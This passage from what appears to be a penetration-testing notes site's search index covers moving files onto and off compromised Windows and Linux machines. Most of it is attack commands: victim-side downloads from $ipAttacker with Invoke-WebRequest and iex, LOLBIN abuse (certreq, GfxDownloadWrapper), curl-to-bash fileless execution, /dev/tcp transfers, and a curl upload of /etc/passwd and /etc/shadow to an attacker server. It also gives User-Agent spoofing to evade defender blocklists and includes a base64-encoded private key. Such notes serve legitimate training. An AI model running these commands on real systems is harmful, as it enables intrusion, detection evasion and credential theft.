http://$ipAttacker:$portAttacker/nc.exe\n</code></pre>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#invoke-webrequest","title":"Invoke-WebRequest","text":"<p>In the attacker's machine:</p> <pre><code>nc -lnvp $port\n</code></pre> <p>In the  victim's machine:</p> <pre><code>PS C:\\htb&gt; Invoke-WebRequest http://$ipAttacker:$portAttacker/nc.exe -OutFile \"C:\\Users\\Public\\nc.exe\" \n\nPS C:\\htb&gt; Invoke-RestMethod http://$ipAttacker:$portAttacker/nc.exe -OutFile \"C:\\Users\\Public\\nc.exe\"\n</code></pre>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#winhttprequest","title":"WinHttpRequest","text":"<p>In the attacker's machine:</p> <pre><code>nc -lnvp $port\n</code></pre> <p>In the  victim's machine:</p> <pre><code>PS C:\\htb&gt; $h=new-object -com WinHttp.WinHttpRequest.5.1;\n\nPS C:\\htb&gt; $h.open('GET','http://$ipAttacker:$portAttacker/nc.exe',$false);\nPS C:\\htb&gt; $h.send();\nPS C:\\htb&gt; iex $h.ResponseText\n</code></pre>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#msxml2","title":"Msxml2","text":"<p>In the attacker's machine:</p> <pre><code>nc -lnvp $port\n</code></pre> <p>In the  victim's machine:</p> <pre><code>PS C:\\htb&gt; $h=New-Object -ComObject Msxml2.XMLHTTP;\nPS C:\\htb&gt; $h.open('GET','http://$ipAttacker:$portAttacker/nc.exe',$false);\nPS C:\\htb&gt; $h.send();\nPS C:\\htb&gt; iex $h.responseText\n</code></pre>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#linux","title":"Linux","text":"","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#file-encryption-on-linux-encrypting-etcpasswd-with-openssl","title":"File Encryption on Linux: Encrypting /etc/passwd with openssl","text":"<pre><code>openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc\n</code></pre> <p>Decrypt passwd.enc with openssl</p> <pre><code>openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd\n</code></pre>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#openssl","title":"openssl","text":"<p>Create a certificate in the attacker's machine:</p> <pre><code>openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem\n</code></pre> <p>Launch the openssl server in the attacker's machine:</p> <pre><code>openssl s_server -quiet -accept $portAttacker -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh\n</code></pre> <p>Next, with the server running, we need to download the file from the compromised machine. So, download the file from the victim's machine:</p> <pre><code>openssl s_client -connect $ipAttacker:$portAttacker -quiet &gt; LinEnum.sh\n</code></pre>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#lolbas-gtfobins","title":"LOLBAS / GTFOBins","text":"<ul> <li>LOLBAS Project for Windows Binaries</li> <li>GTFOBins for Linux Binaries</li> </ul> <p>Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a \"LOLBIN\" (living off the land binary), alternatively also known as \"misplaced trust binaries.\"</p>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#gfxdownloadwrapperexe","title":"GfxDownloadWrapper.exe","text":"<p>An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:</p> <pre><code>GfxDownloadWrapper.exe \"http://$ipAttacker:$portAttacker/mimikatz.exe\" \"C:\\Temp\\nc.exe\"\n</code></pre> <p>Such a binary might be permitted to run by application whitelisting and be excluded from alerting.</p>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#certreqexe","title":"certreq.exe","text":"<p>Upload win.init to our attacker's machine</p> <p>Attacker machine</p> <pre><code>sudo nc -lnvp $portAttacker\n</code></pre> <p>Victim's machine: </p> <pre><code>certreq.exe -Post -config http://$ipAttacker:$portAttacker/ c:\\windows\\win.ini\n</code></pre> <p>If you get an error when running\u00a0<code>certreq.exe</code>, the version you are using may not contain the\u00a0<code>-Post</code>\u00a0parameter. You can download an updated version\u00a0here\u00a0and try again.</p>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#changing-user-agent","title":"Changing User Agent","text":"","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-evading-detection/#request-with-invoke-webrequest-and-chrome-user-agent","title":"Request with Invoke-WebRequest and Chrome User agent","text":"<p>If administrators or defenders have blacklisted any of these User Agents,\u00a0Invoke-WebRequest\u00a0contains a UserAgent parameter, which allows for changing the default user agent</p> <p>Listing user agents: </p> <pre><code>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label=\"User Agent\";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl\n</code></pre> <p>Results: </p> <pre><code>Name       : InternetExplorer\nUser Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)\n\nName       : FireFox\nUser Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0\n\nName       : Chrome\nUser Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0\n             Safari/534.6\n\nName       : Opera\nUser Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1\n\nName       : Safari\nUser Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0\n             Safari/533.16\n</code></pre> <p>Using Chrome User Agent:</p> <pre><code>Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile \"C:\\Users\\Public\\nc.exe\"\n</code></pre> <pre><code>nc -lvnp 80\n</code></pre>","tags":["evading detection","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/","title":"Transferring files with code","text":"","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#upload-operations","title":"Upload operations","text":"","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#python3","title":"Python3","text":"<p>uploadserver</p> <pre><code># Start the Python uploadserver Module\npython3 -m uploadserver \n\n# Uploading a File Using a Python One-liner\npython3 -c 'import requests;requests.post(\"http://$ipAttacker:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'\n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#download-operations","title":"Download operations","text":"","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#python","title":"Python","text":"","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#python2-download","title":"python2 Download","text":"<pre><code>python2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#python-3-download","title":"Python 3 - Download","text":"<pre><code>python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#php","title":"PHP","text":"","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#php-download-with-file_get_contents-and-file_put_contents","title":"PHP Download with File_get_contents() and  file_put_contents ()","text":"<pre><code># PHP file_get_contents() module to download content from a website combined with the file_put_contents() module to save the file into a directory. PHP can be used to run one-liners from an operating system command line using the option -r.\nphp -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'\n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#php-download-with-fopen","title":"PHP Download with Fopen()","text":"<pre><code>php -r 'const BUFFER = 1024; $fremote = \nfopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'\n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#php-download-a-file-and-pipe-it-to-bash","title":"PHP Download a File and Pipe it to Bash","text":"<pre><code>php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash\n# The URL can be used as a filename with the @file function if the fopen wrappers have been enabled. \n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#ruby","title":"Ruby","text":"<p>Download a File:</p> <pre><code>ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))'\n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#perl","title":"Perl","text":"<p>Download a File:</p> <pre><code>perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'\n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#javascript","title":"JavaScript","text":"<p>Download a File Using JavaScript and cscript.exe:</p> <p>First save the following text as\u00a0<code>wget.js</code>:</p> <pre><code>// wget.js content:\nvar WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\n\nWScript.Echo(WinHttpReq.ResponseText);\n\n/* To save a binary file use this code instead of previous line\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(\"out.bin\");\n*/\n</code></pre> <p>Now, we can execute the JavaScript code and download the file from  a Windows command prompt or PowerShell terminal:</p> <pre><code>cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1\n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#vbscript","title":"VBScript","text":"<p>VBScript (\"Microsoft Visual Basic Scripting Edition\") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic.</p> <p>We'll create a file called <code>wget.vbs</code> and save the following content:</p> <pre><code>dim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n</code></pre> <p>Now, download a File Using VBScript and cscript.exe</p> <pre><code>cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1\n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#netcat","title":"Netcat","text":"","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#printing-information-on-screen","title":"Printing information on screen","text":"<p>On the server side (attacking machine):</p> <pre><code>#data will be printed on screen\nnc -lvp &lt;port&gt;  \n</code></pre> <p>On the client side (victim's machine):</p> <pre><code>echo \u201chello\u201d | nc -v $ip &lt;port&gt;\n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#transfer-data-and-save-it-in-a-file-with-netcat","title":"Transfer data and save it in a file with netcat","text":"","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#victims-machine-listening-on-port","title":"Victim's Machine listening on <code>&lt;Port&gt;</code>","text":"<p>On the client side (victim's machine):</p> <pre><code>nc -lvp &lt;port&gt; &gt; received.txt  \n\n# Example using Ncat\nncat -lvp &lt;port&gt; --recv-only &gt; received.txt  \n# --recv-only: to close the connection once the file transfer is finished when using ncat.\n</code></pre> <p>On the server side (attacking machine):</p> <pre><code># Data will be stored in received.txt file.\ncat tobesentfile.txt | nc -v $ip &lt;port&gt;\n\n\n# Alternative:\nnc -q 0 $ipVictim &lt;port&gt; &lt; tobesentfile.txt\n# The option -q 0 will tell Netcat to close the connection once it finishes. \n\nncat --send-only $ipVictim &lt;port&gt; &lt; tobesentfile.txt \n# The --send-only flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted.\n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#victims-machine-connects-to-netcat-only-to-receive-the-file","title":"Victim's machine connects to netcat only to receive the file","text":"<p>Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our attacker machine and send a file as input to Netcat.</p> <p>On the server side (attacking machine):</p> <pre><code>sudo nc -l -p 443 -q 0 &lt; tobesentfile.txt\n\nncat -l -p 443 --send-only &lt; tobesentfile.txt\n</code></pre> <p>On the client side (victim's machine): Compromised Machine Connect to Netcat to Receive the File</p> <pre><code>nc $ipAttacker 443 &gt; tobesentfile.txt\n\nncat $ipAttacker 443 --recv-only &gt; tobesentfile.txt\n\n# If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file\u00a0[/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html). Using /dev/tcp to Receive the File\ncat &lt; /dev/tcp/$ipAttacker/443 &gt; received.txt \n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#powershell-session-file-transfer","title":"PowerShell Session File Transfer","text":"<p>There may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use\u00a0PowerShell Remoting, aka WinRM, to perform file transfer operations.  To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the <code>Remote Management Users</code> group, or have explicit permissions for PowerShell Remoting in the session configuration.</p> <p>PowerShell Remoting uses Windows Remote Management (WinRM), which is the Microsoft implementation of the Web Services for Management (WS-Management) protocol, to allow users to run PowerShell commands on remote computers.</p> <p>Let's create an example and transfer a file from <code>DC01</code> to <code>DATABASE01</code> and vice versa.</p> <pre><code>PS C:\\htb&gt; whoami\n\nhtb\\administrator\n\nPS C:\\htb&gt; hostname\n\nDC01\n</code></pre> <pre><code>Test-NetConnection -ComputerName DATABASE01 -Port 5985\n\nComputerName     : DATABASE01\nRemoteAddress    : 192.168.1.101\nRemotePort       : 5985\nInterfaceAlias   : Ethernet0\nSourceAddress    : 192.168.1.100\nTcpTestSucceeded : True\n</code></pre> <p>Because this session already has privileges over <code>DATABASE01</code>, we don't need to specify credentials.</p> <p>Create a PowerShell Remoting Session to DATABASE01</p> <pre><code>PS C:\\htb&gt; $Session = New-PSSession -ComputerName DATABASE01\n</code></pre> <p>We can use the <code>Copy-Item</code> cmdlet to copy a file from our local machine <code>DC01</code> to the <code>DATABASE01</code> session we have <code>$Session</code> or vice versa.</p> <p>Copy samplefile.txt from our Localhost to the DATABASE01 Session</p> <pre><code>PS C:\\htb&gt; Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\\n</code></pre> <p>Copy DATABASE.txt from DATABASE01 Session to our Localhost</p> <pre><code>PS C:\\htb&gt; Copy-Item -Path \"C:\\Users\\Administrator\\Desktop\\DATABASE.txt\" -Destination C:\\ -FromSession $Session\n</code></pre>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#sharing-resources","title":"Sharing resources","text":"","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#rdp","title":"RDP","text":"<p>RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. </p> <p>We can use xfreerdp or rdesktop to download a file by mounting a linux folder. This shared will  allow us to transfer files to and from the RDP session. </p>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#mounting-a-linux-folder-using-rdesktop","title":"Mounting a Linux Folder Using rdesktop","text":"<pre><code>rdesktop $ipVictim -d &lt;domain&gt; -u &lt;username&gt; -p &lt;'Password0@'&gt; -r disk:linux=\"/home/user/rdesktop/files\"\n</code></pre> <p>HTB_@cademy_stdnt!</p>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-code/#mounting-a-linux-folder-using-xfreerdp","title":"Mounting a Linux Folder Using xfreerdp","text":"<p><code>bash xfreerdp /v:ipVictim /d:&lt;domain&gt; /u:&lt;username&gt; /p:&lt;'Password0@'&gt; /drive:linux,/home/plaintext/htb/academy/filetransfer</code></p> <p>To access the directory, we can connect to \\tsclient\\ in Windows, allowing us to transfer files to and from the RDP session.</p>","tags":["exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/","title":"Transferring files techniques  - Linux","text":"","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#download-to-linux","title":"Download to Linux","text":"","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#base64","title":"Base64","text":"<p>To avoid firewall protections we can:</p> <p>1. Base64 encode the file:</p> <pre><code>base64 file.php -w 0\n\n# Alternative\ncat file |base64 -w 0;echo\n</code></pre> <p>2. Copy the base64 string, go to the remote host and decode it and pipe to a file:</p> <pre><code>echo -n \"Looooooong-string-encoded-in-base64\" | base64 -d &gt; file.php\n# -n: do not output the trailing newline\n</code></pre>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#replicating-client-server","title":"Replicating client-server","text":"","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#1-setting-up-a-server-in-the-attacking-machine","title":"1. Setting up a server in the attacking machine","text":"<p>See different techniques</p>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#2-download-files-from-victims-machine","title":"2. Download files from victim's machine","text":"","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#wget","title":"wget","text":"<pre><code>wget http://&lt;SERVERIP&gt;:&lt;SERVERPORT&gt;/&lt;file&gt; -O  &lt;OutputNameForFile&gt;\n# -O:  set the output filename.\n</code></pre>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#curl","title":"curl","text":"<pre><code>curl http://http://&lt;SERVERIP&gt;:&lt;SERVERPORT&gt;/&lt;file&gt; -o &lt;OutputNameForFile&gt;\n</code></pre>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#fileless-downloads-using-linux","title":"Fileless downloads using Linux","text":"<p>Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.</p>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#fileless-download-with-curl","title":"Fileless Download with cURL","text":"<pre><code>curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash\n</code></pre>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#fileless-download-with-wget","title":"Fileless Download with wget","text":"<pre><code>wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3\n</code></pre>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#bash-downloads","title":"Bash downloads","text":"<p>As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads. On the server side (attacking machine), setup a server by using one of the methodologies applied above.</p> <p>On the client side (victim's machine):</p> <pre><code># Connecting to the Target Webserver (attacking machine serving the file)\nexec 3&lt;&gt;/dev/tcp/$ip/80\n\n# Requesting the file to the server \necho -e \"GET /file.sh HTTP/1.1\\n\\n\"&gt;&amp;3\n\n# Printing the Response\ncat &lt;&amp;3\n</code></pre>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#ssh-downloads-scp","title":"SSH downloads: SCP","text":"<p>SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol. </p> <p>Two requirements:</p> <ul> <li>we have ssh user credentials on the remote host</li> <li>ssh is open on port 22</li> </ul> <p>On the server's side (attacker's machine):</p> <pre><code># Enable the service\nsudo systemctl enable ssh\n\n# Start the server\nsudo systemctl start ssh\n\n# Check if port is listening\nnetstat -lnpt\n</code></pre> <p>From the attacker machine too:</p> <pre><code># Download file foobar.txt saved in the victim's machin. Command is run from attacker machine connecting to the remote host (victim's machine)\nscp username@$IPvictim:foobar.txt /some/local/directory\n</code></pre> <pre><code># Upload file foo.txt saved in attacker machine into the victim's. Command is run from attacker machine connecting to the remote host (victim's machine)\nscp foo.txt username@$IPvictim:/some/remote/directory\n</code></pre>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#upload-to-linux","title":"Upload to Linux","text":"","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#web-upload","title":"Web upload","text":"<p>We can use uploadserver.</p> <pre><code># Install\npython3 -m pip install --user uploadserver\n\n\n# As we will use https, we will create a self-signed certificate.\nopenssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\n\n#  The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.\nmkdir https &amp;&amp; cd https\n\n\n# Start the web server\npython3 -m uploadserver 443 --server-certificate /location/different/folder/server.pem\n\n# Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.\ncurl -X POST https://$attackerIP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure\n# We used the option --insecure because we used a self-signed certificate that we trust.\n</code></pre>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#ssh-uploads-scp","title":"SSH uploads: SCP","text":"<p>SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol. </p> <p>Two requirements:</p> <ul> <li>we have ssh user credentials on the remote host</li> <li>ssh is open on port 22</li> </ul> <p>On the server's side (attacker's machine):</p> <pre><code># Enable the service\nsudo systemctl enable ssh\n\n# Start the server\nsudo systemctl start ssh\n\n# Check if port is listening\nnetstat -lnpt\n</code></pre> <p>From the attacker machine too:</p> <pre><code># Upload file foo.txt saved in attacker machine into the victim's. Command is run from attacker machine connecting to the remote host (victim's machine)\nscp foo.txt username@$IPvictim:/some/remote/directory\n</code></pre>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#rsync-over-ssh","title":"Rsync over SSH","text":"<p>More about RSYNC protocol.</p> <p>Before you can start transferring files and directories with rsync over SSH, make sure you can\u00a0use SSH to connect to a remote server. Once verified, you can begin backing up your data. Ensure your destination system has sufficient storage space.</p> <p>The syntax for copying files to a remote server over SSH with the\u00a0<code>rsync</code>\u00a0command is:</p> <pre><code>rsync OPTION SourceDirectory_or_filePath user@serverIP_or_name:Target\n\n# Example\nrsync ~/Desktop/Dir1/\"source pdf sample.pdf\" test@192.168.56.100:~/Desktop/test\n</code></pre>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-linux/#backdoors","title":"Backdoors","text":"<p>See reverse shells, bind shells, and web shells.</p>","tags":["linux","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/","title":"Transferring files techniques  - Windows","text":"<p>See different techniques to set up a server in the attacking machine, probably a Kali</p> Quick link to resources <ul> <li>[PayloadsAllTheThings: Windows download and execute methods](</li> </ul> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md)</p>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#certutil","title":"Certutil","text":"<p>It's possible to download a file with certutil:</p> <pre><code>certutil.exe -urlcache -split -f \"https://download.sysinternals.com/files/PSTools.zip\" pstools.zip\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#download-to-windows","title":"Download to Windows","text":"","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#powershell-base64-encode-decode","title":"PowerShell Base64 Encode &amp; Decode","text":"<p>Upload from linux (attacker) to Windows (victim) </p> <p>If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content.</p> <pre><code># In attacker machine, check SSH Key MD5 Hash\nmd5sum id_rsa\n\n# In attacker machine, encode SSH Key to Base64\ncat id_rsa |base64 -w 0;echo\n\n\n# Copy output and paste it into the Windows PowerShell terminal in the victim's machine\nPS C:\\lala&gt; [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\"))\n\n# Confirming the MD5 Hashes Match with  Get-FileHash cmdlet\nPS C:\\lala&gt; Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5\n</code></pre> <p>More about the Get-FileHash cmdlet.</p> <p>Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings. </p>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#powershell-systemnetwebclient","title":"Powershell  System.Net.WebClient","text":"<p>PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over <code>HTTP</code>, <code>HTTPS</code> or <code>FTP</code>.</p> <p>The following table describes WebClient methods for downloading data from a resource:</p> Method Description OpenRead Returns the data from a resource as a Stream. OpenReadAsync Returns the data from a resource without blocking the calling thread. DownloadData Downloads data from a resource and returns a Byte array. DownloadDataAsync Downloads data from a resource and returns a Byte array without blocking the calling thread. DownloadFile Downloads data from a resource to a local file. DownloadFileAsync Downloads data from a resource to a local file without blocking the calling thread. DownloadString Downloads a String from a resource and returns a String. DownloadStringAsync Downloads a String from a resource without blocking the calling thread.","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#powershell-downloadstring-fileless-method","title":"PowerShell DownloadString - Fileless Method","text":"<pre><code># Example: (New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File 